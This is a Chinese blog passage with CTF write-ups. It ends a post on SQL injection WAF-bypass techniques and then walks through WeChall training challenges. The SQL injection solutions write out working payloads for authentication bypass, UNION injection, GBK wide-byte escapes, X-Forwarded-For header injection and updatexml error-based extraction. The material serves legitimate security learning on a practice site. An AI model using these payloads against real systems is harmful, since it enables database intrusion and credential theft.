<h1 id="（8）比较符-lt-gt-绕过"><a href="#（8）比较符-lt-gt-绕过" class="headerlink" title="（8）比较符(&lt;,&gt;)绕过"></a>（8）比较符(&lt;,&gt;)绕过</h1><p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest，strcmp来进行绕过了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&#x3D;1 and greatest(ascii(substr(database(),0,1)),64)&#x3D;64</span><br><span class="line"></span><br><span class="line">select strcmp(left(database(),1),0x32);#lpad(&#39;asd&#39;,2,0)</span><br><span class="line"></span><br><span class="line">if(substr(id,1,1)in(0x41),1,3)</span><br></pre></td></tr></table></figure>
<p>新学习了一种骚骚的注入姿势in、between、order by</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select * from yz where a in (&#39;aaa&#39;); </span><br><span class="line">select substr(a,1,1) in (&#39;a&#39;) from yz ;</span><br><span class="line"></span><br><span class="line">select * from yz where a between &#39;a&#39; and &#39;b&#39;; </span><br><span class="line">select * from yz where a between 0x89 and 0x90;</span><br><span class="line"></span><br><span class="line">select * from yz union select 1,2,3 order by 1; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>也可以用like，根据排列顺序进行真值判断</p>
<h1 id="（9）注释符绕过"><a href="#（9）注释符绕过" class="headerlink" title="（9）注释符绕过"></a>（9）注释符绕过</h1><p>在注入时的注释符一般为# –当两者不能用时就不能闭合引号<br>这里介绍一个奇淫巧技<br>select 1,2,3 from yz where ‘1’/1=(1=1)/‘1’=’1’<br>(1=1)中就有了判断位为下面的注入打下基础</p>
<h1 id="（10）宽字节绕过"><a href="#（10）宽字节绕过" class="headerlink" title="（10）宽字节绕过"></a>（10）宽字节绕过</h1><p>字节注入也是在最近的项目中发现的问题，大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在%df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗’，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。</p>
<p>注：<code>select</code>防止用户自定义的名称和mysql保留字冲突</p>
<h1 id="（11）with-rollup"><a href="#（11）with-rollup" class="headerlink" title="（11）with rollup"></a>（11）with rollup</h1><p>一般结合group by使用</p>
<p> select 1 as test from yz group by test with rollup limit 1 offset 1;</p>
<p>+——+</p>
<p>| test |</p>
<p>+——+</p>
<p>| NULL |</p>
<p>+——+</p>
<h1 id="（12）无列名注入"><a href="#（12）无列名注入" class="headerlink" title="（12）无列名注入"></a>（12）无列名注入</h1><p>给未知列名起别名<br>select a from (select 1,2,3aunion select * from yz)v;</p>
<h1 id="（13）-判断列数绕过"><a href="#（13）-判断列数绕过" class="headerlink" title="（13） 判断列数绕过"></a>（13） 判断列数绕过</h1><p>当order by 被过滤后就可以使用into 变量来绕过<br>select * from yz limit 1,1 into @a,@b,@c;</p>
<h1 id="3-SQL注入知识"><a href="#3-SQL注入知识" class="headerlink" title="3.SQL注入知识"></a>3.SQL注入知识</h1><p>1.SQL越界 ，也就是能执行自己的sql语句<br>2.盲注的话找一个点可以控制两种不同的反应<br>3.取数据并做真值判断<br>4.写脚本暴库</p>
<p>上边是基于一般的注入题目的解题步骤，如果有特殊条件也可灵活变通</p>
<h1 id="mysql数据库元信息"><a href="#mysql数据库元信息" class="headerlink" title="mysql数据库元信息"></a>mysql数据库元信息</h1><p>在mysql中存在information_schema是一个信息数据库，在这个数据库中保存了Mysql服务器所保存的所有的其他数据库的信息，如数据库名，数据库的表，表的字段名称<br>和访问权限。在informa_schema中常用的表有:</p>
<p>schemata:存储了mysql中所有的数据库信息，返回的内容与show databases的结果是一样的。<br>tables:存储了数据库中的表的信息。详细地描述了某个表属于哪个schema，表类型，表引擎。<br>show tables from secuiry的结果就是来自这个表<br>columns:详细地描述了某张表的所有的列以及每个列的信息。<br>show columns from users的结果就是来自这个表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select database(); #查选数据库</span><br><span class="line"></span><br><span class="line">select group_concat(schema_name) from information_schema.schemata</span><br><span class="line"></span><br><span class="line">select schema_name from information_schema.schemata limit 0,1 #查询数据库</span><br><span class="line"></span><br><span class="line">select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1; #查询表</span><br><span class="line"></span><br><span class="line">select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1; #查询列</span><br></pre></td></tr></table></figure>



      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/01/25/CTF-Web-SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" data-id="ckkdrz0yv0000ugusa4k3041i" data-title="SQL注入WAF绕过姿势" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-wp-wechall答案" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/01/24/CTF-wp-wechall%E7%AD%94%E6%A1%88/" class="article-date">
  <time class="dt-published" datetime="2021-01-24T07:38:22.000Z" itemprop="datePublished">2021-01-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/01/24/CTF-wp-wechall%E7%AD%94%E6%A1%88/">wechall答案</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Training-Get-Sourced"><a href="#Training-Get-Sourced" class="headerlink" title="Training: Get Sourced"></a>Training: Get Sourced</h1><p>看源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- You are looking for this password: html_sourcecode --&gt;     </span><br></pre></td></tr></table></figure>
<p>提交html_sourcecode即可</p>
<h1 id="Training-Stegano"><a href="#Training-Stegano" class="headerlink" title="Training: Stegano"></a>Training: Stegano</h1><p>工具：winhex</p>
<p>将图片拖拽到winhex中</p>
<p>得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Look what the hex-edit revealed: passwd:steganoI</span><br></pre></td></tr></table></figure>
<p>提交steganoI</p>
<h1 id="Training-Crypto-Caesar"><a href="#Training-Crypto-Caesar" class="headerlink" title="Training: Crypto - Caesar"></a>Training: Crypto - Caesar</h1><p>考察凯撒密码</p>
<p>由于每次出来的字符串都不一样，所以把位移数26遍历了一遍，找到其中有实际意义的那一行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">str1 &#x3D; &quot;AOL XBPJR IYVDU MVE QBTWZ VCLY AOL SHGF KVN VM JHLZHY HUK FVBY BUPXBL ZVSBAPVU PZ WPHLPYYJYVOO&quot;</span><br><span class="line">str2 &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(26):</span><br><span class="line">	for s in str1:</span><br><span class="line">		if s !&#x3D; &quot; &quot;:</span><br><span class="line">			num &#x3D; (ord(s) - ord(&#39;A&#39;) + i) % 26</span><br><span class="line">			str2 +&#x3D; chr(ord(&#39;A&#39;)+num)</span><br><span class="line">		else:</span><br><span class="line">			str2 +&#x3D; s</span><br><span class="line">	print(str2)</span><br><span class="line">	str2 &#x3D; &quot;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training: WWW-Robots"></a>Training: WWW-Robots</h1><p>考察robots.txt</p>
<p>没想到直接放到根目录底下了。。。</p>
<p>访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wechall.net&#x2F;robots.txt</span><br></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;challenge&#x2F;training&#x2F;www&#x2F;robots&#x2F;T0PS3CR3T</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User-agent: Yandex</span><br><span class="line">Disallow: *</span><br></pre></td></tr></table></figure>
<p>访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wechall.net&#x2F;challenge&#x2F;training&#x2F;www&#x2F;robots&#x2F;T0PS3CR3T</span><br></pre></td></tr></table></figure>
<h1 id="Training-ASCII"><a href="#Training-ASCII" class="headerlink" title="Training ASCII"></a>Training ASCII</h1><p>考察：ASCII码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">str1 &#x3D; &quot;84, 104, 101, 32, 115, 111, 108, 117, 116, 105, 111, 110, 32, 105, 115, 58, 32, 111, 109, 105, 104, 112, 115, 115, 104, 108, 97, 110, 112&quot;</span><br><span class="line"></span><br><span class="line">str2 &#x3D; str1.split(&quot;,&quot;)</span><br><span class="line">text &#x3D; &quot;&quot;</span><br><span class="line">for i in str2:</span><br><span class="line">	temp &#x3D; int(i)</span><br><span class="line">	text +&#x3D; chr(temp)</span><br><span class="line">print(text)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The solution is: omihpsshlanp</span><br></pre></td></tr></table></figure>
<h1 id="Encoding-URL"><a href="#Encoding-URL" class="headerlink" title="Encoding: URL"></a>Encoding: URL</h1><p>用firefox的hackbar解码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%59%69%70%70%65%68%21%20%59%6F%75%72%20%55%52%4C%20%69%73%20%63%68%61%6C%6C%65%6E%67%65%2F%74%72%61%69%6E%69%6E%67%2F%65%6E%63%6F%64%69%6E%67%73%2F%75%72%6C%2F%73%61%77%5F%6C%6F%74%69%6F%6E%2E%70%68%70%3F%70%3D%73%67%6D%65%67%61%70%62%69%6D%70%61%26%63%69%64%3D%35%32%23%70%61%73%73%77%6F%72%64%3D%66%69%62%72%65%5F%6F%70%74%69%63%73%20%56%65%72%79%20%77%65%6C%6C%20%64%6F%6E%65%21</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Yippeh! Your URL is challenge&#x2F;training&#x2F;encodings&#x2F;url&#x2F;saw_lotion.php?p&#x3D;sgmegapbimpa&amp;cid&#x3D;52#password&#x3D;fibre_optics Very well done!</span><br></pre></td></tr></table></figure>
<h1 id="Prime-Factory"><a href="#Prime-Factory" class="headerlink" title="Prime Factory"></a>Prime Factory</h1><p>竟然是算法题。。。</p>
<p>本身为素数，所有数位上的数字和也为素数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">high = <span class="number">1000000</span>+<span class="number">1</span></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># prime_num = &#123;&quot;2&quot;, &quot;3&quot;, &quot;5&quot;, &quot;7&quot;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validNum</span>(<span class="params">num</span>):</span></span><br><span class="line">	str_num = <span class="built_in">str</span>(num)</span><br><span class="line">	temp = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> s <span class="keyword">in</span> str_num:</span><br><span class="line">		temp += <span class="built_in">int</span>(s)</span><br><span class="line">	<span class="keyword">if</span> validPrime(temp):</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validPrime</span>(<span class="params">num</span>):</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">int</span>(math.sqrt(num) )+ <span class="number">1</span>):</span><br><span class="line">		<span class="keyword">if</span> num % j == <span class="number">0</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(high, high * <span class="number">10</span>):</span><br><span class="line">	<span class="keyword">if</span> validPrime(i) <span class="keyword">and</span> validNum(i):</span><br><span class="line">		ans += <span class="built_in">str</span>(i)</span><br><span class="line">		print(i)</span><br><span class="line">		flag += <span class="number">1</span></span><br><span class="line">		<span class="keyword">if</span> flag == <span class="number">2</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1000033</span><br><span class="line">1000037</span><br><span class="line">10000331000037</span><br></pre></td></tr></table></figure>
<h1 id="Training-Encoding"><a href="#Training-Encoding" class="headerlink" title="Training: Encoding"></a>Training: Encoding</h1><p>考察：二进制的转换，ASCII码，JPocketKnife</p>
<p>JPocket是用来编码转换的小工具</p>
<p>由于只有01，判断是ASCII码的题</p>
<p>标准ASCII码使用7位二进制数来表示所有大小写字母，数字，标点，特殊控制符（剩余1位为0）</p>
<p>本题要修改BitsPerBlock为7（长度为441，不能被8整除）</p>
<p>![CTF-wp-wechall Training Encoding2](.\pic\CTF-wp-wechall Training Encoding2.png)</p>
<p>![CTF-wp-wechall Training Encoding1](.\pic\CTF-wp-wechall Training Encoding1.png)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This text is 7-bit encoded ascii. Your password is easystarter.</span><br></pre></td></tr></table></figure>


<h2 id="ASCII码"><a href="#ASCII码" class="headerlink" title="ASCII码"></a>ASCII码</h2><p>标准ASCII码使用7位二进制数来表示所有大小写字母，数字，标点，特殊控制符（剩余1位为0）</p>
<h1 id="Training-Programming-1"><a href="#Training-Programming-1" class="headerlink" title="Training: Programming 1"></a>Training: Programming 1</h1><p>考察：python的requests库</p>
<p>拿到访问链接的值，填充到第二个链接访问</p>
<p>由于需要确认访问者身份，因此需要用到cookie</p>
<p>进入到第一个链接，发现cookie如下</p>
<p>![CTF-wp-wechall Training Programming1](.\pic\CTF-wp-wechall Training Programming1.png)</p>
<p>那么就可以构造以下脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&quot;http://www.wechall.net/challenge/training/programming1/index.php?action=request&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;http://www.wechall.net/challenge/training/programming1/index.php?answer=&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">cookie = <span class="built_in">dict</span>(WC=<span class="string">&quot;13191858-57927-oQHWYThmhwmYUy2X&quot;</span>)</span><br><span class="line">resp1 = requests.get(url1, cookies=cookie)</span><br><span class="line">resp2 = requests.get(url2.<span class="built_in">format</span>(resp1.text), cookies=cookie)</span><br><span class="line"></span><br><span class="line">print(resp2.text)</span><br></pre></td></tr></table></figure>
<h1 id="Training-Regex"><a href="#Training-Regex" class="headerlink" title="Training: Regex"></a>Training: Regex</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;^$&#x2F;</span><br></pre></td></tr></table></figure>
<h1 id="Training-MYSQL-I"><a href="#Training-MYSQL-I" class="headerlink" title="Training: MYSQL I"></a>Training: MYSQL I</h1><p>考察：万能密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin&#39; #</span><br><span class="line">password: 123</span><br></pre></td></tr></table></figure>
<p>注意，username处不能写admin’ or 1=1#，因为username在原sql语句中是where的筛选条件</p>
<h1 id="Training-MYSQL-II"><a href="#Training-MYSQL-II" class="headerlink" title="Training: MYSQL II"></a>Training: MYSQL II</h1><p>考察：账号密码分开验证时，MYSQL登陆的绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: -1&#39; union select 1,&#39;admin&#39;,md5(&#39;password&#39;) #</span><br><span class="line">password: password</span><br></pre></td></tr></table></figure>
<h1 id="No-Escape"><a href="#No-Escape" class="headerlink" title="No Escape"></a>No Escape</h1><p>考察：PHP代码审计，mysql的反引号</p>
<p>观察可知，URL处的vote变量即每次提交button时加1的变量，猜测可在URL出注入</p>
<p>阅读源码，直接跳到sql语句一处</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query &#x3D; &quot;UPDATE noescvotes SET &#96;$who&#96;&#x3D;&#96;$who&#96;+1 WHERE id&#x3D;1&quot;;</span><br></pre></td></tr></table></figure>
<p>故payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.wechall.net&#x2F;challenge&#x2F;no_escape&#x2F;index.php?vote_for&#x3D;bill&#96;&#x3D;111--+</span><br></pre></td></tr></table></figure>
<p>注意此处为反引号，因为原sql语句就是反引号</p>
<h2 id="mysql中的单引号、双引号、反引号"><a href="#mysql中的单引号、双引号、反引号" class="headerlink" title="mysql中的单引号、双引号、反引号"></a>mysql中的单引号、双引号、反引号</h2><p>单双引号用法相同，是使用字符串时使用的符号</p>
<p>反引号用于区分mysql中的保留字符和普通字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#假如表A中有一列名为select，查询该列</span><br><span class="line">select select from A;   #错误</span><br><span class="line">select &#96;select&#96; from A;  #正确</span><br></pre></td></tr></table></figure>
<h1 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes"></a>addslashes</h1><p>考察：宽字节注入<br>由于编码为gbk，且使用了addslashes过滤username处的单引号，使用宽字节注入</p>
<p>由于原sql语句为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query &#x3D; &quot;SELECT username FROM users WHERE username&#x3D;&#39;$username&#39; AND password&#x3D;&#39;$password&#39;&quot;;</span><br></pre></td></tr></table></figure>
<p>使用宽字节注入以后，语句为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username FROM users WHERE username&#x3D;&#39;admin 运&#39; # AND password&#x3D;&#39;password&#39;</span><br></pre></td></tr></table></figure>
<p>因此，还要再从数据库中选出username，因此有了如下payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.wechall.net&#x2F;challenge&#x2F;addslashes&#x2F;index.php?username&#x3D;admin+%Df%27+union+select+username+from+users+limit+1,1+%23&amp;password&#x3D;123&amp;login&#x3D;%E6%B3%A8%E5%86%8C</span><br></pre></td></tr></table></figure>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p><strong>参考</strong></p>
<p>​    <a target="_blank" rel="noopener" href="https://blog.csdn.net/heiseweiye/article/details/82723478">https://blog.csdn.net/heiseweiye/article/details/82723478</a></p>
<p><strong>条件</strong></p>
<p>​    编码为gbk</p>
<p><strong>用法</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;SQL-GBK&#x2F;index.php?id&#x3D;1</span><br><span class="line">select * from user where  id &#x3D;&#39;1\&#39; and 1&#x3D;1#&#39;</span><br><span class="line">	id&#x3D;1&#39; and 1&#x3D;1%23</span><br><span class="line">select * from user where id &#x3D;&#39;1運&#39; and 1&#x3D;1#&#39;</span><br><span class="line">	id&#x3D;1%df&#39; and 1&#x3D;1%23</span><br></pre></td></tr></table></figure>
<p><strong>原理</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GBK为多字节编码，两个字节代表一个汉字，此时%DF与后面的&#x2F;，也就是%5c变成了一个汉字</span><br></pre></td></tr></table></figure>
<h1 id="The-Guestbook"><a href="#The-Guestbook" class="headerlink" title="The Guestbook"></a>The Guestbook</h1><p>考察：X-Forwarded-For注入</p>
<p>上来搜$query语句，总共有下面这些</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query &#x3D; &quot;DELETE FROM gbook_book WHERE gbb_time&lt;$cut&quot;;</span><br><span class="line">$query &#x3D; &quot;INSERT INTO gbook_book VALUES(&#39;$playerid&#39;, $userid, $time, &#39;$ip&#39;, &#39;$message&#39;)&quot;; </span><br><span class="line">$query &#x3D; &quot;DELETE FROM gbook_book WHERE gbb_sessid&#x3D;&#39;$playerid&#39;&quot;;</span><br><span class="line">$query &#x3D; &quot;SELECT * FROM gbook_book WHERE gbb_sessid&#x3D;&#39;$playerid&#39;&quot;;</span><br></pre></td></tr></table></figure>
<p>只有第2和4句有注入可能</p>
<p>先看第4句，深入找一下playerid的地方，最终溯源到gbook_playerID，这个再往前找，是SESSION_ID。跳过</p>
<p>看第2句，这五个变量来源</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$playerid &#x3D; gbook_playerID(true); &#x2F;&#x2F; Current Player</span><br><span class="line">$userid &#x3D; 0; # guestbook has no login yet.</span><br><span class="line">$time &#x3D; time();</span><br><span class="line">$ip &#x3D; gbook_getIP();</span><br><span class="line">$message &#x3D; GDO::escape($message); </span><br></pre></td></tr></table></figure>
<p>溯源以后发现只有ip有注入可能</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function gbook_getIP()</span><br><span class="line">&#123;</span><br><span class="line">        if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;</span><br><span class="line">                return $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];</span><br><span class="line">        &#125;</span><br><span class="line">        elseif (isset($_SERVER[&#39;HTTP_VIA&#39;])) &#123; </span><br><span class="line">                return $_SERVER[&#39;HTTP_VIA&#39;];</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">                return $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>X-Forwarded-For注入，改一下包就完事了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1&#39;,(SELECT gbu_password FROM gbook_user WHERE gbu_name&#x3D;&#39;Admin&#39;));#</span><br></pre></td></tr></table></figure>
<p>得到密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TheBrownFoxAndTheLazyDog</span><br></pre></td></tr></table></figure>
<h1 id="MD5-salt"><a href="#MD5-salt" class="headerlink" title="MD5.salt"></a>MD5.salt</h1><p>考察：md5，回显注入</p>
<p>参考：<a target="_blank" rel="noopener" href="http://rk700.github.io/2014/06/17/md5-salt/">http://rk700.github.io/2014/06/17/md5-salt/</a></p>
<p>抓包，是post提交</p>
<p>尝试username：admin’，有回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GDO Error(1064): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;admin&#39;&#39;&#39; at line 1</span><br><span class="line">SELECT * FROM users WHERE username&#x3D;&#39;admin&#39;&#39;</span><br></pre></td></tr></table></figure>
<p>故尝试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username:admin&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>
<p>回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello Admin... checking your credentials...</span><br></pre></td></tr></table></figure>
<p>用户名Admin的值是回显的，把password传给Admin的文职</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;-1&#39; union select password,3 from users where username&#x3D;&#39;Admin&#39;#</span><br></pre></td></tr></table></figure>
<p>回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello 215c61d0104f8925b5f7e4e87a7cbdfa... checking your credentials...</span><br></pre></td></tr></table></figure>
<p>然后需要破解MD5的工具，网上没有现成答案也没有免费的，跳过</p>
<p>等等</p>
<p>参考链接的wp没看懂怎么操作的，但是通过空密码用户去套取salt的方式值得参考</p>
<h1 id="Table-Names"><a href="#Table-Names" class="headerlink" title="Table Names"></a>Table Names</h1><p>输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: test</span><br><span class="line">password: test</span><br></pre></td></tr></table></figure>
<p>可进入</p>
<p>输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: test&#39;#</span><br><span class="line">password: test</span><br></pre></td></tr></table></figure>
<p>得到同样信息，说明是可注入的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: test&#39; and 1&#x3D;1#</span><br><span class="line">password: test</span><br></pre></td></tr></table></figure>
<p>同样通过，那么可以使用布尔盲注或者updatexml</p>
<p>优先选择updatexml，比较方便</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: test&#39; and updatexml(1,concat(0x7e,(database(),0x7e),1)#</span><br><span class="line">password: test</span><br></pre></td></tr></table></figure>
